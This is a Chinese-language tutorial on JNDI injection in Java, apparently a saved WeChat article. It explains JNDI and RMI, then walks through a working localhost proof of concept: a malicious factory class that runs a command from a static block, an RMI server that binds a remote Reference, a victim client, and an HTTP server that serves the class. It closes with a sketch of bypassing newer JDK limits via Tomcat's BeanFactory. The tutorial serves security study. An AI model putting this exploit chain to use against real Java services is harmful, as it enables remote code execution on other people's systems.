> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/mTcoHcm8G-aBRqdjGM-G1Q)

0x01 前言
-------

在 Java 反序列化漏洞挖掘或利用的时候经常会遇到 RMI、JNDI、JRMP 这些概念，其中 RMI 是一个基于序列化的 Java 远程方法调用机制。作为一个常见的反序列化入口，它和反序列化漏洞有着千丝万缕的联系。除了直接攻击 RMI 服务接口外（比如：CVE-2017-3241），我们在构造反序列化漏洞利用时也可以结合 RMI 方便的实现远程代码执行。

我们在之前的课程中说到过动态类的加载，而 jndi 注入就是利用动态类的加载来完成攻击的，在这之前，我们先来了解一下 jndi 注入的基础知识

0x02 啥是 jndi
------------

**JNDI** 是 Java 命名与目录接口（Java Naming and Directory Interface），在 J2EE 规范中是重要的规范之一，有不少大佬可能认为，没有透彻理解 JNDI 的意义和作用，就没有真正掌握 J2EE 特别是 EJB 的知识。

我们来举个常规的 JDBC 的例子

```
Connection jdbcconn=null; try {  Class.forName("com.mysql.jdbc.Driver");  jdbcconn=DriverManager.getConnection("jdbc:mysql://MyDBServer?user=xxx&password=xxx");  ......  jdbcconn.close(); } catch(Exception e) {  e.printStackTrace(); } finally {  if(jdbcconn!=null) {   try {    jdbcconn.close();   } catch(SQLException e) {          } }
```

这是常规的链接数据库的例子，也是其他语言程序员的常见做法。

### 优点

1.  无可厚非这种方法在小规模的开发过程中不会有任何影响，只要程序员熟悉 Java 和 Mysql，就可以很快开发出相应的程序。
    

### 缺点

1、数据库服务器地址和名称 、用户名和口令都可能需要改变，由此引发 JDBC URL 需要修改；

2、数据库可能改用别的产品，如改用 DB2 或者 Oracle，引发 JDBC 驱动程序包和类名需要修改；

3、随着实际使用终端的增加，原配置的连接池参数可能需要调整；

### 如何解决

在对于 Java 这种强抽象模式的编程语言来说，肯定不会允许这么 LowB 的存在，程序员不应该关注后台的数据库是啥，版本是多少。所以为了统一化管理，就诞生了 JNDI

0x03 使用 JNDI
------------

在一开始很多人都会被 jndi、rmi 这些词汇搞的晕头转向，而且很多文章中提到了可以用 jndi 调用 rmi, 就更容易让人发昏了。我们只要知道 jndi 是对各种访问目录服务的逻辑进行了再封装, 也就是以前我们访问 rmi 与 ldap 要写的代码差别很大，但是有了 jndi 这一层，我们就可以用 jndi 的方式来轻松访问 rmi 或者 ldap 服务，这样访问不同的服务的代码实现基本是一样的。

![](https://mmbiz.qpic.cn/mmbiz_jpg/uqkCa4umw7iaE9KWvEe9zricnQKIN5qhmxolNTKMG6Ml9vhUNkd0EzFZy4KicrMoKsLdxkh2JOuHz0z4GjyG8CfHg/640?wx_fmt=jpeg)

### 代码实现

JNDI 中有绑定和查找的方法：

```
- bind：将第一个参数绑定到第二个参数的对象上面
- lookup：通过提供的名称查找对象
```

我们来举个例子：

`IHello.java`

```
package com.evalshell.jndi;import java.rmi.Remote;import java.rmi.RemoteException;public interface IHello extends Remote {    public String SayHello(String name) throws RemoteException;}
```

`IHelloImpl.java`

```
package com.evalshell.jndi;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class IHelloImpl extends UnicastRemoteObject implements IHello {    public IHelloImpl() throws RemoteException {        super();    }    @Override    public String SayHello(String name) throws RemoteException {        return "Hello " + name;    }}
```

`CallService.java`

```
package com.evalshell.jndi;import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import java.util.Properties;public class CallService {    public static void main(String[] args) throws Exception{        Properties env = new Properties();        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");        Context ctx = new InitialContext(env);        Registry registry = LocateRegistry.createRegistry(1099);        IHello hello = new IHelloImpl();        registry.bind("hello", hello);        IHello rhello = (IHello) ctx.lookup("rmi://localhost:1099/hello");        System.out.println(rhello.SayHello("fengxuan"));    }}
```

![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7iaE9KWvEe9zricnQKIN5qhmxczYib69gcZ8d6HicQsZUWgsYRE56KvI3fkQricXibBabL1jHjzkC9V8ruA/640?wx_fmt=png)

由于上面的代码将服务端与客户端写到了一起，所以看着不那么清晰，我看到很多文章里吧 JNDI 工厂初始化这一步操作划分到了服务端，我觉得是错误的，配置 jndi 工厂与 jndi 的 url 和端口应该是客户端的事情。

> 可以对比一下前几章的 rmi demo 与这里的 jndi demo 访问远程对象的区别，加深理解

JNDI 注入
-------

### 注入的原理

我们来到 JNDI 注入的核心部分，关于 JNDI 注入，@pwntester 在 BlackHat 上的讲义中写的已经很详细。我们这里重点讲一下和 RMI 反序列化相关的部分。接触过 JNDI 注入的同学可能会疑问，不应该是 RMI 服务器最终执行远程方法吗，为什么目标服务器 lookup() 一个恶意的 RMI 服务地址，会被执行恶意代码呢？

在 JNDI 服务中，RMI 服务端除了直接绑定远程对象之外，还可以通过 References 类来绑定一个外部的远程对象（当前名称目录系统之外的对象）。绑定了 Reference 之后，服务端会先通过 Referenceable.getReference() 获取绑定对象的引用，并且在目录中保存。当客户端在 lookup() 查找这个远程对象时，客户端会获取相应的 object factory，最终通过 factory 类将 reference 转换为具体的对象实例。

整个利用流程如下：

1.  目标代码中调用了 InitialContext.lookup(URI)，且 URI 为用户可控；
    
2.  攻击者控制 URI 参数为恶意的 RMI 服务地址，如：rmi://hacker_rmi_server//name；
    
3.  攻击者 RMI 服务器向目标返回一个 Reference 对象，Reference 对象中指定某个精心构造的 Factory 类；
    
4.  目标在进行 lookup() 操作时，会动态加载并实例化 Factory 类，接着调用 factory.getObjectInstance() 获取外部远程对象实例；
    
5.  攻击者可以在 Factory 类文件的构造方法、静态代码块、getObjectInstance() 方法等处写入恶意代码，达到 RCE 的效果；
    

在这里，攻击目标扮演的相当于是 JNDI 客户端的角色，攻击者通过搭建一个恶意的 RMI 服务端来实施攻击。我们跟入 lookup() 函数的代码中，可以看到 JNDI 中对 Reference 类的处理逻辑，最终会调用 NamingManager.getObjectInstance()：

实战案例
----

1.  首先创建一个恶意的对象
    
    ```
    package com.evalshell.jndi;import javax.lang.model.element.Name;import javax.naming.Context;import java.io.BufferedInputStream;import java.io.BufferedReader;import java.io.IOException;import java.io.InputStreamReader;import java.util.HashMap;public class BadObject {    public static void exec(String cmd) throws IOException {        String sb = "";        BufferedInputStream bufferedInputStream = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());        BufferedReader inBr = new BufferedReader(new InputStreamReader(bufferedInputStream));        String lineStr;        while((lineStr = inBr.readLine()) != null){            sb += lineStr+"\n";        }        inBr.close();        inBr.close();    }    public Object getObjectInstance(Object obj, Name name, Context context, HashMap<?, ?> environment) throws Exception{        return null;    }    static {        try{            exec("gnome-calculator");        }catch (Exception e){            e.printStackTrace();        }    }}
    ```
    

可以看到这里利用的是 static 代码块执行命令

2.  创建 rmi 服务端，绑定恶意的 Reference 到 rmi 注册表
    

```
package com.evalshell.jndi;import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.NamingException;import javax.naming.Reference;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class Server {    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {        Registry registry = LocateRegistry.createRegistry(1100);        String url = "http://127.0.0.1:7777/";        System.out.println("Create RMI registry on port 1100");        Reference reference = new Reference("EvilObj", "EvilObj", url);        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);        registry.bind("evil", referenceWrapper);    }}
```

3.  创建一个客户端（受害者）
    
    ```
    package com.evalshell.jndi;import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;public class Client {    public static void main(String[] args) throws NamingException {        Context context = new InitialContext();        context.lookup("rmi://localhost:1100/evil");    }}
    ```
    
    可以看到这里的 lookup 方法的参数是指向我设定的恶意 rmi 地址的。
    
    然后先编译该项目，生成 class 文件，然后在 class 文件目录下用 python 启动一个简单的 HTTP Server:
    
    `python -m SimpleHTTPServer 7777`
    
    执行上述命令就会在 7777 端口、当前目录下运行一个 HTTP Server：
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7iaE9KWvEe9zricnQKIN5qhmxIZiatdWSWPcEdkxW2gZ8Wfy9248kFour0eZIwtD1LLls1eIhAyciaQUg/640?wx_fmt=png)
    
    然后运行 Server 端，启动 rmi registry 服务
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7iaE9KWvEe9zricnQKIN5qhmxxN19sQGhO73oMUnEhibX2zuCSMAN9ibL2D8PtdiaJ4Uabn0lc0iaCa4Iow/640?wx_fmt=png)
    
    如果是 JDK1.7 的版本，就可以运行成功
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7iaE9KWvEe9zricnQKIN5qhmxxKL72jfZlbok1jEiaMs0I1NcJFBuzjntZ9WXUWSf7lHMIIibhTG2kHQQ/640?wx_fmt=png)
    
    JDK1.8 最后运行报错
    
    ![](https://mmbiz.qpic.cn/mmbiz_png/uqkCa4umw7iaE9KWvEe9zricnQKIN5qhmxbY6F3eQ5GAaC35wThLZFFZgBISQib83UUPgsfM3BBKFqmnr0CibBZl6Q/640?wx_fmt=png)
    
    而此时使用 JNDI Server 返回恶意 Reference 是可以成功利用的，因为 JDK 8u191 以后才对 LDAP JNDI Reference 进行了限制。
    
    > Tips: 测试过程中有个细节，我们在 JDK 8u102 中使用 RMI Server + JNDI Reference 可以成功利用，而此时我们手工将 com.sun.jndi.rmi.object.trustURLCodebase 等属性设置为 false，并不会如预期一样有高版本 JDK 的限制效果出现，Payload 依然可以利用。
    

### 绕过高版本 JDK 限制：利用本地 Class 作为 Reference Factory

在高版本中（如：JDK8u191 以上版本）虽然不能从远程加载恶意的 Factory，但是我们依然可以在返回的 Reference 中指定 Factory Class，这个工厂类必须在受害目标本地的 CLASSPATH 中。工厂类必须实现 javax.naming.spi.ObjectFactory 接口，并且至少存在一个 getObjectInstance() 方法。org.apache.naming.factory.BeanFactory 刚好满足条件并且存在被利用的可能。org.apache.naming.factory.BeanFactory 存在于 Tomcat 依赖包中，所以使用也是非常广泛。

org.apache.naming.factory.BeanFactory 在 getObjectInstance() 中会通过反射的方式实例化 Reference 所指向的任意 Bean Class，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。

参考
--

https://tntaxin.blog.csdn.net/article/details/105586691